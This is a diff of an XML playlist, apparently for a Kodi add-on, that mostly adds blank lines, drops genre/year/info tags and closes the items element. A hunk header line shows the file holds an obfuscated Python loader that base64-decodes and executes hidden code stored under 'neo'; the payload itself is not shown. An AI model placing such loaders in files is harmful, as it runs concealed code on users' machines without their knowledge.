@@ -1,6 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <items>
 
+
 <item>
 <title>[COLOR gold]*[/COLOR][COLOR white]Temporada 1[/COLOR]</title>    
 <link>$doregex[c]</link>
@@ -8,9 +9,6 @@
 <name>c</name>
 <listrepeat><![CDATA[
 <title>[c.param1] [c.param2]</title>
-<genre>[c.param1] [c.param2]</genre>
-<year>[c.param1] [c.param2]</year>
-<info>[c.param1] [c.param2]</info>
 <link>$doregex[selecion_inteligente]</link>
 <thumbnail>[c.param4]</thumbnail>
 <fanart>[c.param5]</fanart>
@@ -99,3 +97,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <thumbnail>https://i.imgur.com/HjDs40J.jpg</thumbnail>
 <fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
 </item>
+
+
+
+</items>
